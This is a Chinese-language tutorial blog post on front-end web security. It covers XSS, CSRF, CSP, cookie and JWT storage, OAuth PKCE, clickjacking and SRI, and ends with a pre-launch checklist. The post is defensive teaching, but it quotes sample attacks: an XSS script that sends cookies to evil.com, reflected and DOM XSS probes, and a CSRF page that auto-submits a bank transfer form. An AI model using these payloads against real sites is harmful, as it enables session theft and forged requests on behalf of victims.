---
title: "前端安全攻防：XSS、CSRF、CSP 与认证实践"
description: "从攻击者视角拆解 XSS（存储型/反射型/DOM 型）和 CSRF 的原理与利用方式，再从防御者视角梳理 CSP、SameSite Cookie、CORS、JWT/OAuth 的正确配置，配合真实漏洞案例和代码示例"
publishDate: "2026-05-15T00:00:00.000Z"
updatedDate: ""
tags: ["安全", "XSS", "CSRF", "CSP", "JWT", "OAuth"]
draft: false
pinned: false
ogImage: ""
coverImage:
  src: ""
  alt: ""
---

# 前端安全攻防：XSS、CSRF、CSP 与认证实践

前端安全容易被忽视的原因之一是：大多数漏洞不会在开发时报错，而是在用户遭受攻击后才暴露。理解攻击原理是做好防御的前提——知道攻击者怎么利用漏洞，才能知道哪些防御是有效的、哪些是表面功夫。

---

## XSS（跨站脚本攻击）

### 三种类型

**存储型 XSS**：恶意脚本被存入数据库，每次页面渲染时执行。典型场景是评论区、富文本编辑器。

```
攻击者发帖内容：<script>document.location='https://evil.com/steal?c='+document.cookie</script>

其他用户访问该帖子时，浏览器执行脚本，Cookie 被发送给攻击者
```

**反射型 XSS**：恶意脚本通过 URL 参数传入，服务端直接将参数拼入 HTML 响应。

```
正常 URL：https://example.com/search?q=hello
攻击 URL：https://example.com/search?q=<script>alert(document.cookie)</script>

服务端：<p>搜索结果：{query}</p>  ← 直接插入未转义的 query
```

**DOM 型 XSS**：漏洞在前端 JS 代码，不经过服务端。

```ts
// ❌ 直接将 URL hash 写入 DOM
const keyword = location.hash.slice(1)
document.getElementById('result').innerHTML = keyword
// 访问 /page#<img src=x onerror=alert(1)> 即可触发
```

### 危害

- 窃取 Cookie / localStorage 中的 Token
- 以用户身份发起请求（比 CSRF 更强，因为能读取响应）
- 修改页面内容（钓鱼、伪造表单）
- 键盘记录

### 防御

**1. 输出转义（最核心）**

永远不要将不可信数据直接拼入 HTML，必须转义：

```ts
function escapeHtml(str: string): string {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;')
}

// React / Vue 的模板插值默认转义，不会有问题
// 危险的是绕过框架的写法：
element.innerHTML = userInput          // ❌ 危险
document.write(userInput)              // ❌ 危险
element.textContent = userInput        // ✅ 安全（不解析 HTML）
```

**2. 避免危险 API**

```ts
// ❌ 以下 API 直接执行字符串为代码
eval(userInput)
new Function(userInput)
setTimeout(userInput, 0)   // 字符串形式
element.setAttribute('onload', userInput)

// Vue / React 中
<div v-html="userInput">          // ❌ 等同于 innerHTML
<div dangerouslySetInnerHTML=...>  // ❌ 需要确保已消毒
```

**3. 富文本场景用白名单消毒**

需要保留部分 HTML（如富文本编辑器）时，用 DOMPurify 白名单过滤：

```ts
import DOMPurify from 'dompurify'

// 只允许安全的标签和属性
const clean = DOMPurify.sanitize(userHtml, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'ul', 'li'],
  ALLOWED_ATTR: ['href', 'title'],
})

element.innerHTML = clean
```

**4. HttpOnly Cookie**

存放 Token 的 Cookie 设置 `HttpOnly`，JS 无法读取，XSS 即使执行也偷不到 Token：

```
Set-Cookie: token=xxx; HttpOnly; Secure; SameSite=Strict
```

---

## CSRF（跨站请求伪造）

### 原理

浏览器发送请求时会**自动携带目标域的 Cookie**。攻击者利用这一特性，诱导已登录用户访问恶意页面，由恶意页面向目标站发起请求：

```html
<!-- 攻击者的恶意页面 evil.com -->
<!-- 用户访问后，浏览器自动携带 bank.com 的 Cookie 发起转账请求 -->
<img src="https://bank.com/transfer?to=attacker&amount=10000" />

<!-- 或表单自动提交 -->
<form action="https://bank.com/transfer" method="POST" id="f">
  <input name="to" value="attacker" />
  <input name="amount" value="10000" />
</form>
<script>document.getElementById('f').submit()</script>
```

### CSRF vs XSS

| | XSS | CSRF |
|--|-----|------|
| 需要注入脚本 | 是 | 否 |
| 能读取响应 | 是 | 否（跨域限制） |
| 防御核心 | 转义 + CSP | CSRF Token + SameSite |

### 防御

**1. SameSite Cookie（现代主流方案）**

```
Set-Cookie: token=xxx; SameSite=Strict
# Strict：跨站请求完全不携带 Cookie
# Lax：跨站 GET 请求携带（导航），POST 不携带（默认值）
# None：跨站都携带，需同时设置 Secure
```

Chrome 80 起默认 `SameSite=Lax`，已大幅降低 CSRF 风险。

**2. CSRF Token**

服务端生成随机 Token 存入 Session，每个表单/请求携带此 Token，服务端验证：

```ts title="request.ts"
// 从 meta 标签读取服务端渲染的 CSRF Token
const csrfToken = document.querySelector<HTMLMetaElement>(
  'meta[name="csrf-token"]'
)?.content

// axios 拦截器统一注入
axios.interceptors.request.use((config) => {
  if (['post', 'put', 'delete', 'patch'].includes(config.method ?? '')) {
    config.headers['X-CSRF-Token'] = csrfToken
  }
  return config
})
```

自定义请求头（如 `X-CSRF-Token`）浏览器会对跨域请求发起 CORS 预检，恶意页面无法通过预检，从而阻断攻击。

**3. 验证 Origin / Referer**

服务端校验请求头中的 `Origin` 或 `Referer`，拒绝来自非预期域的请求。注意 `Referer` 可被用户禁用，`Origin` 更可靠。

---

## CSP（内容安全策略）

CSP 是通过响应头告诉浏览器：**这个页面只信任来自哪些来源的资源**，浏览器会拦截违规的脚本、样式、请求。

### 基本配置

```nginx
# Nginx 响应头
Content-Security-Policy:
  default-src 'self';
  script-src 'self' https://cdn.example.com;
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  connect-src 'self' https://api.example.com;
  frame-ancestors 'none';
```

| 指令 | 作用 |
|------|------|
| `default-src` | 其他指令的默认值 |
| `script-src` | JS 来源 |
| `style-src` | CSS 来源 |
| `img-src` | 图片来源 |
| `connect-src` | fetch / XHR / WebSocket 目标 |
| `frame-ancestors` | 谁可以用 iframe 嵌入本页面 |

### CSP 如何防御 XSS

即使攻击者注入了 `<script>` 标签，只要脚本来源不在白名单内，浏览器直接拒绝执行：

```
# 内联脚本默认被 CSP 阻断（除非显式允许 'unsafe-inline'）
Content-Security-Policy: script-src 'self'

# 攻击者注入的内联脚本无法执行：
<script>document.cookie...</script>  ← 被浏览器拦截
```

### nonce：允许特定内联脚本

完全禁止内联脚本会影响正常使用（如服务端渲染的初始化数据）。用 `nonce` 每次随机生成：

```html
<!-- 服务端每次请求生成新的随机 nonce -->
<meta http-equiv="Content-Security-Policy"
      content="script-src 'nonce-r4nd0m123'" />

<!-- 只有带匹配 nonce 的脚本才能执行 -->
<script nonce="r4nd0m123">
  window.__INITIAL_STATE__ = { ... }
</script>
```

攻击者注入的脚本没有正确的 nonce，无法执行。

:::caution[不要用 'unsafe-inline' 和 'unsafe-eval']
`'unsafe-inline'` 允许所有内联脚本，等于废了 CSP 对 XSS 的防御。如果需要内联脚本，用 nonce 或 hash 代替。`'unsafe-eval'` 同理，允许 `eval()` 执行。
:::

### 仅报告模式（上线前测试）

```
Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report
```

`Report-Only` 模式不拦截，只上报违规到指定地址，适合在正式启用前评估影响范围。

---

## 认证安全：JWT 与 OAuth

### JWT 的安全存储

JWT 存放位置的安全性对比：

| 存储位置 | XSS 风险 | CSRF 风险 | 说明 |
|---------|---------|---------|------|
| `localStorage` | 高 | 低 | JS 可读，XSS 即窃取 |
| `sessionStorage` | 高 | 低 | 同上，关标签页失效 |
| `Cookie (HttpOnly)` | 低 | 中 | JS 不可读，需配合 SameSite |
| 内存变量 | 低 | 低 | 刷新页面丢失 |

推荐方案：**HttpOnly + Secure + SameSite=Strict Cookie**，是安全性最高的方案：

```
Set-Cookie: access_token=<jwt>; HttpOnly; Secure; SameSite=Strict; Path=/api
```

### JWT 的常见误区

```ts
// ❌ 误区 1：前端"验证" JWT 签名
// JWT 签名验证必须在服务端进行，前端解码只是读 payload，不验证真实性
const payload = JSON.parse(atob(token.split('.')[1]))  // 只是 base64 解码

// ❌ 误区 2：把敏感信息放 payload
// JWT payload 只是 base64 编码，不是加密，任何人都能解读
const token = sign({ userId: 1, password: 'xxx' }, secret)  // 千万不要这样做

// ✅ payload 只放非敏感的标识信息
const token = sign({ userId: 1, role: 'admin', exp: ... }, secret)
```

### OAuth 2.0 PKCE 流程

前端应用（SPA）使用 OAuth 授权时，应使用 **PKCE（Proof Key for Code Exchange）** 流程，防止授权码被截获：

```ts
// 1. 生成 code_verifier（随机字符串）和 code_challenge（其 SHA-256 哈希）
async function generatePKCE() {
  const verifier = crypto.randomUUID().replace(/-/g, '') + crypto.randomUUID().replace(/-/g, '')
  const encoder = new TextEncoder()
  const data = encoder.encode(verifier)
  const hash = await crypto.subtle.digest('SHA-256', data)
  const challenge = btoa(String.fromCharCode(...new Uint8Array(hash)))
    .replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '')
  return { verifier, challenge }
}

// 2. 跳转授权页，携带 code_challenge
const { verifier, challenge } = await generatePKCE()
sessionStorage.setItem('pkce_verifier', verifier)

const authUrl = new URL('https://auth.example.com/authorize')
authUrl.searchParams.set('response_type', 'code')
authUrl.searchParams.set('client_id', CLIENT_ID)
authUrl.searchParams.set('redirect_uri', REDIRECT_URI)
authUrl.searchParams.set('code_challenge', challenge)
authUrl.searchParams.set('code_challenge_method', 'S256')
location.href = authUrl.toString()

// 3. 回调页用 code_verifier 换 token
async function handleCallback(code: string) {
  const verifier = sessionStorage.getItem('pkce_verifier')!
  const res = await fetch('https://auth.example.com/token', {
    method: 'POST',
    body: new URLSearchParams({
      grant_type: 'authorization_code',
      code,
      redirect_uri: REDIRECT_URI,
      client_id: CLIENT_ID,
      code_verifier: verifier,
    }),
  })
  return res.json()
}
```

即使授权码在回调 URL 中被截获，没有 `code_verifier` 也无法换取 Token。

---

## 其他常见漏洞

### 点击劫持（Clickjacking）

攻击者用透明 iframe 覆盖在诱骗内容上，用户以为点击的是正常按钮，实际触发了 iframe 内的操作。

防御：设置 `X-Frame-Options` 或 CSP `frame-ancestors`：

```nginx
X-Frame-Options: DENY
# 或者用 CSP（更灵活）：
Content-Security-Policy: frame-ancestors 'none'
```

### 敏感信息泄漏

```ts
// ❌ 错误示例：前端暴露内部信息
console.log('API Key:', import.meta.env.VITE_SECRET_KEY)  // 打包进前端代码
console.error(error)  // 可能包含 SQL 语句、文件路径等

// ❌ 注释中的密钥（会进入源码，通过 Source Map 或直接查看 JS 可见）
// TODO: token = 'sk-xxxxxxxx'

// ❌ URL 中的敏感参数（会记录在日志、Referer、浏览器历史）
fetch(`/api/reset?token=${resetToken}`)  // 应改用 POST body
```

### 子资源完整性（SRI）

从 CDN 加载第三方资源时，验证文件哈希，防止 CDN 被投毒：

```html
<script
  src="https://cdn.example.com/lib.min.js"
  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
  crossorigin="anonymous"
></script>
```

---

## 安全检查清单

上线前过一遍：

- [ ] 所有用户输入在输出前都经过转义或 DOMPurify 消毒
- [ ] 未使用 `innerHTML`、`eval`、`document.write` 直接处理用户数据
- [ ] Cookie 设置了 `HttpOnly`、`Secure`、`SameSite`
- [ ] 敏感接口有 CSRF Token 或自定义请求头校验
- [ ] 已配置 CSP 响应头（至少 `Report-Only` 模式采集违规）
- [ ] JWT 不存放在 `localStorage`，不在 payload 中存敏感数据
- [ ] 设置了 `X-Frame-Options` 或 CSP `frame-ancestors`
- [ ] 前端代码中无硬编码密钥或 Token
- [ ] CDN 第三方资源使用了 SRI

:::tip[OWASP Top 10]
OWASP（开放 Web 应用安全项目）每几年发布一次最常见的 Web 安全漏洞排名，是安全评估的权威参考。本文覆盖的是其中与前端最相关的几类，完整列表参见 owasp.org。
:::
